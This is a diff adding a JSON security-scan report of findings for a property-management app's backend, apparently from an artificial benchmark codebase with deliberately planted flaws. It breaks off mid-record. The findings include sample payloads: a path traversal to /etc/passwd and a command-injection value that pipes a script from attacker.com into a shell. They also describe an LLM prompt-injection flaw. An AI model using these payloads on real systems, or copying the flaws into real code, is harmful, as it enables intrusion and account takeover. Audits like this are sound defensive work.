@@ -1,0 +1,1039 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.authorization.registration-role-assignment",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 82,
+        "col": 5,
+        "offset": 2623
+      },
+      "end": {
+        "line": 82,
+        "col": 52,
+        "offset": 2670
+      },
+      "extra": {
+        "message": "The unauthenticated POST /api/auth/register endpoint accepts a 'role' field from the request body and assigns it directly to the new user (user.role = (role as any) || \"property_manager\") with no validation or authorization. Any anonymous attacker can register with role \"property_admin\" and obtain full administrative access to the application (user listing, password resets, data deletion), a complete authentication/authorization bypass.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.password-reset-token-disclosure",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 136,
+        "col": 5,
+        "offset": 4263
+      },
+      "end": {
+        "line": 136,
+        "col": 26,
+        "offset": 4284
+      },
+      "extra": {
+        "message": "POST /api/auth/forgot-password returns the password reset token directly in the HTTP response (resetToken: resetToken). Anyone who knows (or enumerates) a victim's email address can call this endpoint, receive the live reset token, and use it on POST /api/auth/reset-password to take over any account including the property_admin account. The reset token must be delivered out-of-band (e.g. via email), never echoed to the caller.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Account Takeover",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-jwt-secret",
+      "path": "backend/src/index.ts",
+      "start": {
+        "line": 45,
+        "col": 5,
+        "offset": 1286
+      },
+      "end": {
+        "line": 45,
+        "col": 70,
+        "offset": 1351
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded value \"pm-jwt-secret-change-in-production\" when the JWT_SECRET environment variable is not set (line 45), and the cookie secret similarly falls back to \"pm-cookie-secret\" (line 49). If deployed without the env var, any attacker can forge valid JWTs for any user id/role (including property_admin) and fully bypass authentication.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.tls.certificate-validation-disabled",
+      "path": "backend/src/database.ts",
+      "start": {
+        "line": 15,
+        "col": 3,
+        "offset": 532
+      },
+      "end": {
+        "line": 15,
+        "col": 80,
+        "offset": 609
+      },
+      "extra": {
+        "message": "In production the database connection is configured with ssl: { rejectUnauthorized: false }, disabling TLS certificate verification. This makes the production database connection vulnerable to man-in-the-middle attacks since any presented certificate is accepted.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-295: Improper Certificate Validation"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.default-database-credentials",
+      "path": "backend/src/database.ts",
+      "start": {
+        "line": 9,
+        "col": 3,
+        "offset": 213
+      },
+      "end": {
+        "line": 9,
+        "col": 95,
+        "offset": 305
+      },
+      "extra": {
+        "message": "The database connection URL defaults to the hardcoded credential string \"postgres://postgres:postgres@localhost:5432/property_management\". Hardcoded default database credentials may be used in deployments where DATABASE_URL is unset.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 363,
+        "col": 3,
+        "offset": 13295
+      },
+      "end": {
+        "line": 363,
+        "col": 71,
+        "offset": 13363
+      },
+      "extra": {
+        "message": "previewLeaseLetterTemplate (GET /api/documents/letter-preview) joins the user-supplied 'templateName' query parameter directly into path.join(LETTER_TEMPLATES_DIR, templateName) with no traversal check, then reads the file with fs.readFileSync and returns its contents. A value like \"../../../../etc/passwd\" lets an authenticated manager/admin read arbitrary files on the server as the application user. The sibling checklist-preview endpoint in inspections.ts correctly validates the resolved path stays under the base directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unrestricted-file-upload",
+      "path": "backend/src/routes/documents.ts",
+      "start": {
+        "line": 267,
+        "col": 3,
+        "offset": 9936
+      },
+      "end": {
+        "line": 267,
+        "col": 52,
+        "offset": 9985
+      },
+      "extra": {
+        "message": "receiveDocumentUpload accepts any file type: the extension is taken from the attacker-controlled upload filename (path.extname(data.filename)) with no MIME/extension allowlist, unlike the inspection photo upload which restricts to image/jpeg and image/png. Uploaded files are written to UPLOAD_DIR which is served statically and unauthenticated at /uploads/ (backend/src/index.ts:65-69), so an uploaded .html/.svg file is served same-origin with Content-Type text/html, enabling stored cross-site scripting against portal users who open the link. Only the unguessable UUID filename protects uploads from unauthenticated access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type",
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal",
+      "path": "backend/src/routes/import-export.ts",
+      "start": {
+        "line": 50,
+        "col": 3,
+        "offset": 2089
+      },
+      "end": {
+        "line": 50,
+        "col": 60,
+        "offset": 2146
+      },
+      "extra": {
+        "message": "archiveInspectionRecords (POST /api/export/archive/inspections) uses the raw 'caseLabel' request-body value as a path segment: path.join(CASE_ARCHIVE_ROOT, caseLabel) followed by fs.mkdirSync({recursive:true}) and fs.writeFileSync. A caseLabel such as \"../../somewhere\" escapes the archive root and allows an authenticated manager to create directories and write attacker-controlled CSV content to arbitrary filesystem locations. The sibling archiveLeaseRecords endpoint correctly sanitizes with path.basename(caseLabel).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-injection",
+      "path": "backend/src/routes/import-export.ts",
+      "start": {
+        "line": 825,
+        "col": 3,
+        "offset": 31705
+      },
+      "end": {
+        "line": 825,
+        "col": 88,
+        "offset": 31790
+      },
+      "extra": {
+        "message": "convertRentRollToPresetFormat (POST /api/export/rent-roll/convert) builds a shell command by interpolating user-supplied 'fileName' and 'outputPreset' into a template string (report-converter --in \"${sourcePath}\" --preset ${outputPreset}) and executes it with child_process.exec. 'outputPreset' is unquoted and unvalidated, so a value like \"xlsx; curl attacker.com/sh | sh\" executes arbitrary commands; 'fileName' can also escape its double quotes. The sibling maintenance convert endpoint is safe: it validates the preset against an allowlist and uses spawn without a shell.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-role-check",
+      "path": "backend/src/routes/import-export.ts",
+      "start": {
+        "line": 131,
+        "col": 5,
+        "offset": 4935
+      },
+      "end": {
+        "line": 131,
+        "col": 36,
+        "offset": 4966
+      },
+      "extra": {
+        "message": "POST /api/import/tenants is protected only by 'authenticate' with no authorize() role check, unlike /api/import/units and /api/import/payments which require property_admin/property_manager. Any authenticated user, including tenants and maintenance workers, can bulk-create tenant user accounts (and leases tied to arbitrary units) across the whole portfolio.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.hardcoded-default-password",
+      "path": "backend/src/routes/import-export.ts",
+      "start": {
+        "line": 198,
+        "col": 15,
+        "offset": 7670
+      },
+      "end": {
+        "line": 198,
+        "col": 73,
+        "offset": 7728
+      },
+      "extra": {
+        "message": "The tenant import endpoint assigns every imported tenant the hardcoded shared password \"welcome123\" (bcrypt.hash(\"welcome123\", salt), repeated at line 259). Imported tenants are never forced to change it, so anyone who knows this widely-known default can log into any imported tenant account and view that unit's tickets, leases, and payments.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1188: Insecure Default Initialization of Resource"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment",
+      "path": "backend/src/routes/units.ts",
+      "start": {
+        "line": 395,
+        "col": 3,
+        "offset": 15391
+      },
+      "end": {
+        "line": 395,
+        "col": 73,
+        "offset": 15461
+      },
+      "extra": {
+        "message": "updateUnitConditionReport (PATCH /api/units/:id/condition) merges every submitted multipart form field directly onto the Unit entity via Object.assign(unit, Object.fromEntries(Object.entries(formEntries))) with no field allowlist, so a manager can overwrite arbitrary entity columns such as id, buildingId, or isActive. The sibling updateUnitReadinessReport endpoint correctly restricts updates to an ALLOWED_FIELDS list.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "backend/src/routes/users.ts",
+      "start": {
+        "line": 438,
+        "col": 3,
+        "offset": 14544
+      },
+      "end": {
+        "line": 438,
+        "col": 52,
+        "offset": 14593
+      },
+      "extra": {
+        "message": "searchStaffDirectory (GET /api/users/staff-directory-search) interpolates the raw 'department' query parameter into the LDAP filter string `(department=*${department}*)` without escaping. An attacker can inject LDAP filter metacharacters ( *, (, ), \\, NUL ) to alter or broaden the filter and enumerate directory entries outside the intended department. The codebase provides escapeLdapFilterValue (RFC 4515) and the sibling verifyStaffDirectoryEmail endpoint uses it correctly.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfiguration.permissive-cors",
+      "path": "backend/src/routes/buildings.ts",
+      "start": {
+        "line": 320,
+        "col": 5,
+        "offset": 11925
+      },
+      "end": {
+        "line": 320,
+        "col": 51,
+        "offset": 11971
+      },
+      "extra": {
+        "message": "getBuildingDirectoryWidget (unauthenticated GET /api/buildings/:id/directory-widget) reflects any value of the Origin request header back as Access-Control-Allow-Origin without an allowlist, exposing the endpoint's responses to arbitrary origins. The sibling marketing-widget endpoint in properties.ts correctly checks the origin against a SYNDICATION_PARTNERS allowlist before reflecting it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 776,
+        "col": 5,
+        "offset": 28174
+      },
+      "end": {
+        "line": 776,
+        "col": 108,
+        "offset": 28277
+      },
+      "extra": {
+        "message": "getLeaseHouseholdStatement (GET /api/leases/:id/statement) skips the tenant ownership check when the client supplies ?sharingMode=household: the condition `lease.tenantId !== authReq.userId && sharingMode !== \"household\"` lets any tenant bypass authorization by adding that query parameter and read any other tenant's full lease statement including complete payment history. The sibling getLeaseAccountSummary endpoint verifies household membership server-side against the tenant's own records.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.template-injection",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 581,
+        "col": 3,
+        "offset": 20003
+      },
+      "end": {
+        "line": 581,
+        "col": 50,
+        "offset": 20050
+      },
+      "extra": {
+        "message": "composeCustomLeaseNotice (POST /api/leases/:id/notices/compose-preview) compiles the user-supplied 'draftText' as a Handlebars template (Handlebars.compile(draftText)) and executes it against tenant data. Passing client-controlled template source to a template engine is server-side template injection; crafted payloads can access template runtime internals (in older Handlebars versions this is RCE) and manipulate the rendered output. The sibling previewStandardLeaseNotice only compiles fixed, server-defined templates.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.role-overreach",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 530,
+        "col": 5,
+        "offset": 18310
+      },
+      "end": {
+        "line": 530,
+        "col": 101,
+        "offset": 18406
+      },
+      "extra": {
+        "message": "POST /api/leases/:id/rent-adjustment authorizes maintenance_worker in addition to admin/manager (authorize(\"property_admin\", \"property_manager\", \"maintenance_worker\")), and the handler's scoping logic only restricts property_manager. A maintenance worker can therefore modify the monthly rent of any lease in any building, an unauthorized modification of financial records that the role should have no access to.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-285: Improper Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 746,
+        "col": 3,
+        "offset": 26938
+      },
+      "end": {
+        "line": 746,
+        "col": 80,
+        "offset": 27015
+      },
+      "extra": {
+        "message": "exportLeaseAgreementFile (GET /api/leases/:id/agreement-export) only checks that a tenant owns the lease. property_manager callers are not restricted to their assigned building and maintenance_worker callers are not checked at all, so both can export any lease's agreement (unit number and rent) portfolio-wide. The sibling getLeaseAccountSummary endpoint enforces the manager building scope.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.missing-message-authentication",
+      "path": "backend/src/routes/leases.ts",
+      "start": {
+        "line": 649,
+        "col": 5,
+        "offset": 22713
+      },
+      "end": {
+        "line": 649,
+        "col": 84,
+        "offset": 22792
+      },
+      "extra": {
+        "message": "resumeRenewalDraft decrypts client-supplied ciphertext with AES-256-CBC using a key derived from a hardcoded fallback secret (\"lease-renewal-draft-secret\") and no authentication tag/MAC, and it returns a distinguishable error for padding failures (\"Draft field padding is invalid\" at line 655), creating a padding-oracle condition. The sibling unit transfer-draft handler in units.ts correctly uses AES-256-GCM with an auth tag.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.session-fixation",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 711,
+        "col": 3,
+        "offset": 26088
+      },
+      "end": {
+        "line": 711,
+        "col": 47,
+        "offset": 26132
+      },
+      "extra": {
+        "message": "checkInFieldTechOnSharedDevice (POST /api/maintenance/shift-checkin) binds the authenticated technician's identity to whatever deviceSessionId cookie value the client already presents (let deviceSessionId = cookies?.deviceSessionId) instead of issuing a fresh one. An attacker who plants a known deviceSessionId on the shared tablet (or presents their own) ends up with a session id that carries the tech's identity after check-in - a classic session fixation. The sibling kiosk endpoint checkInVendorOnWalkthroughKiosk destroys the presented session and issues a fresh id.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.log-injection",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 749,
+        "col": 3,
+        "offset": 27487
+      },
+      "end": {
+        "line": 749,
+        "col": 95,
+        "offset": 27579
+      },
+      "extra": {
+        "message": "recordTicketEscalationNote writes the user-supplied 'reason' directly into the application log (request.log.info(`Ticket ... ${reason}`)) without stripping CR/LF characters, allowing log forging: an attacker can inject newlines and fake log entries that mislead on-call staff reading the log tail. The sibling recordInspectionFollowUpNote in inspections.ts sanitizes the note with .replace(/[\\r\\n\\0]/g, \" \") before logging.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.predictable-token",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 789,
+        "col": 3,
+        "offset": 29304
+      },
+      "end": {
+        "line": 789,
+        "col": 97,
+        "offset": 29398
+      },
+      "extra": {
+        "message": "issueContractorPortalAccess builds the contractor access grant as base64(`${ticket.id}:${Date.now()}:${gatewaySecret}`) where gatewaySecret falls back to the hardcoded default \"contractor-portal\" (line 788). With the default secret the token is trivially forgeable for any ticket id, and it is both echoed in the response body and set in a non-httpOnly cookie (line 791). The sibling walkthrough-access endpoint in inspections.ts uses crypto.randomBytes(32) and an httpOnly cookie.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-345: Insufficient Verification of Data Authenticity"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.information-disclosure.stack-trace",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 824,
+        "col": 7,
+        "offset": 30718
+      },
+      "end": {
+        "line": 824,
+        "col": 98,
+        "offset": 30809
+      },
+      "extra": {
+        "message": "getWorkloadReport returns raw internal error details ({ error: err.message, stack: err.stack, query: request.query }) to the client whenever the caller passes ?reportLevel=verbose. Caller-controlled disclosure of stack traces leaks internal file paths, dependency versions and SQL details. The sibling getBacklogReport gates diagnostics on the server's own NODE_ENV, not a client parameter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.session.cookie-missing-flags",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 718,
+        "col": 3,
+        "offset": 26302
+      },
+      "end": {
+        "line": 718,
+        "col": 51,
+        "offset": 26350
+      },
+      "extra": {
+        "message": "The deviceSessionId session cookie set by the shared-tablet check-in is issued without httpOnly, secure, or sameSite flags (the contractorAccess cookie at line 791 likewise). The sibling issueWalkthroughContextCookie in inspections.ts sets all three flags. Missing flags expose the session id to JavaScript access (XSS theft), plaintext transmission, and cross-site requests.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-1004: Sensitive Cookie Without 'HttpOnly', 'Secure', and 'SameSite' Flags",
+            "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/maintenance.ts",
+      "start": {
+        "line": 142,
+        "col": 7,
+        "offset": 4865
+      },
+      "end": {
+        "line": 142,
+        "col": 47,
+        "offset": 4905
+      },
+      "extra": {
+        "message": "GET /api/maintenance/:id checks only tenant and maintenance_worker scoping. A property_manager is not restricted to their assigned building here, although the list endpoint (lines 50-58), PUT, PATCH status, assign and notes endpoints all enforce the building scope. A manager can therefore read any ticket detail (descriptions, internal messages, tenant info) in any building by id.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.incomplete-scope-filter",
+      "path": "backend/src/routes/tenants.ts",
+      "start": {
+        "line": 32,
+        "col": 11,
+        "offset": 1327
+      },
+      "end": {
+        "line": 37,
+        "col": 19,
+        "offset": 1572
+      },
+      "extra": {
+        "message": "GET /api/tenants: the property_manager branch's comment says \"tenants in their assigned building\", but the query only filters role = tenant and tenantUnitId IS NOT NULL - there is no join/filter on the manager's assignedBuildingId. A manager receives every tenant across all properties (emails, phones, lease and unit data), while the detail endpoint (lines 130-136) correctly enforces building scoping.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.validation.loose-equality-trust",
+      "path": "backend/src/routes/tenants.ts",
+      "start": {
+        "line": 733,
+        "col": 5,
+        "offset": 25856
+      },
+      "end": {
+        "line": 733,
+        "col": 33,
+        "offset": 25884
+      },
+      "extra": {
+        "message": "applyApplicantScreeningDecision approves the applicant when decision.access == true using loose equality on a vendor payload typed as `any` (the stand-in returns the string \"1\"). Values that merely coerce to true (\"1\", 1) are treated as approval without validating the decision's documented shape. The sibling cosigner handler validates the payload with strict comparison (decision.access === true) and a typeof check on tier.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-480: Use of Incorrect Operator"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/tenants.ts",
+      "start": {
+        "line": 749,
+        "col": 3,
+        "offset": 26506
+      },
+      "end": {
+        "line": 749,
+        "col": 61,
+        "offset": 26564
+      },
+      "extra": {
+        "message": "applyCosignerScreeningDecision (POST /api/tenants/:id/cosigner-screening-decision) lacks the property_manager building-scope check that its sibling applyApplicantScreeningDecision performs (lines 718-729). A manager can trigger screening and activate cosigner accounts for applicants in any building, not just their assigned one.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.information-disclosure.credential-in-url",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 31,
+        "col": 3,
+        "offset": 1476
+      },
+      "end": {
+        "line": 31,
+        "col": 114,
+        "offset": 1587
+      },
+      "extra": {
+        "message": "remitPaymentToGateway appends the payment gateway API key as a URL query parameter (api_key=${gatewayKey}) and calls a base URL that defaults to plain http:// (GATEWAY_BASE_URL, line 9). The credential is transmitted in the URL over cleartext HTTP, exposing it to network observers, proxies, and server access logs. The sibling syncPaymentLedger sends the key as a Bearer header over an https base URL.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-598: Use of GET Request Method With Sensitive Query Strings",
+            "CWE-319: Cleartext Transmission of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.http-header-injection",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 106,
+        "col": 3,
+        "offset": 4642
+      },
+      "end": {
+        "line": 106,
+        "col": 90,
+        "offset": 4729
+      },
+      "extra": {
+        "message": "downloadPaymentStatement interpolates the caller-supplied 'document_title' query parameter directly into the Content-Disposition header (`attachment; filename=\"${label}.txt\"`) without any sanitization. Newlines/quotes in the label can inject additional header parameters or break the quoted filename (HTTP response header injection). The sibling exportLeaseAgreementFile in leases.ts strips CR/LF from the label before use.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/payments.ts",
+      "start": {
+        "line": 124,
+        "col": 3,
+        "offset": 5471
+      },
+      "end": {
+        "line": 124,
+        "col": 118,
+        "offset": 5586
+      },
+      "extra": {
+        "message": "waiveLatePaymentPenalty (POST /api/payments/:id/waive-penalty) performs no building-scope check for property_manager callers - the sibling remitPaymentToGateway restricts managers to payments whose lease unit is in their assigned building (lines 23-28). Any manager can waive late penalties on any payment record portfolio-wide, mutating another building's financial data with only a console.log record (no audit log).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 184,
+        "col": 3,
+        "offset": 6114
+      },
+      "end": {
+        "line": 184,
+        "col": 46,
+        "offset": 6157
+      },
+      "extra": {
+        "message": "applyNotificationDeliveryPreferences JSON-parses the x-notification-preferences header and copies every key onto the shared global deliveryDefaults via Object.assign(deliveryDefaults, overrides) with no allowlist. Any authenticated user (including tenants) can overwrite the shared notification-delivery configuration for all users and inject arbitrary keys (including __proto__ manipulation). The sibling workspace-preferences handler in users.ts filters to an allowlist of three known scalar keys.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.jwt.unverified-decode",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 210,
+        "col": 5,
+        "offset": 7090
+      },
+      "end": {
+        "line": 210,
+        "col": 41,
+        "offset": 7126
+      },
+      "extra": {
+        "message": "unsubscribeFromDigest accepts the token with server.jwt.decode(token), which parses the payload without verifying the signature, then trusts decoded.userId and decoded.purpose. Any attacker can craft an unsigned/arbitrary token with purpose \"digest-unsubscribe\" and any userId to redeem unsubscribe links. The sibling previewDigestWithLink correctly uses server.jwt.verify(token).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-345: Insufficient Verification of Data Authenticity"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.jwt.token-without-expiry",
+      "path": "backend/src/routes/notifications.ts",
+      "start": {
+        "line": 196,
+        "col": 3,
+        "offset": 6572
+      },
+      "end": {
+        "line": 196,
+        "col": 92,
+        "offset": 6661
+      },
+      "extra": {
+        "message": "issueDigestUnsubscribeLink signs the unsubscribe JWT without an expiresIn option, so the link never expires once leaked or forwarded. The sibling digest-preview link is correctly constrained with expiresIn: \"30m\".",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/inspections.ts",
+      "start": {
+        "line": 635,
+        "col": 3,
+        "offset": 21625
+      },
+      "end": {
+        "line": 635,
+        "col": 52,
+        "offset": 21674
+      },
+      "extra": {
+        "message": "downloadInspectionPhotoEvidence checks manager building scoping and blocks tenants, but has no branch for maintenance_worker - even though the findings/status endpoints restrict workers to inspections assigned to them (inspection.inspectorId === authReq.userId). Any maintenance worker can download photo evidence for any inspection in any building by id.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authorization.missing-scope-check",
+      "path": "backend/src/routes/inspections.ts",
+      "start": {
+        "line": 120,
+        "col": 7,
+        "offset": 4118
+      },
+      "end": {
+        "line": 120,
+        "col": 56,
+        "offset": 4167
+      },
+      "extra": {
+        "message": "GET /api/inspections/:id enforces manager and tenant scoping but has no check for maintenance_worker, while the list endpoint denies workers entirely (1 = 0) and the status/findings endpoints restrict workers to their assigned inspections. A maintenance worker can read any inspection detail (findings, follow-up notes, documents) portfolio-wide by id.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.llm.prompt-injection",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 341,
+        "col": 3,
+        "offset": 12590
+      },
+      "end": {
+        "line": 341,
+        "col": 140,
+        "offset": 12727
+      },
+      "extra": {
+        "message": "draftReplySuggestion concatenates the client-supplied 'priorSuggestion' body field directly into the LLM prompt (\"Thread so far: \\\"${priorSuggestion}\\\"...\"), letting any authenticated recipient steer the drafting assistant with injected instructions (prompt injection) that can alter the generated tenant-facing reply content.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.information-disclosure.credential-in-url",
+      "path": "backend/src/routes/api-keys.ts",
+      "start": {
+        "line": 12,
+        "col": 3,
+        "offset": 553
+      },
+      "end": {
+        "line": 12,
+        "col": 98,
+        "offset": 648
+      },
+      "extra": {
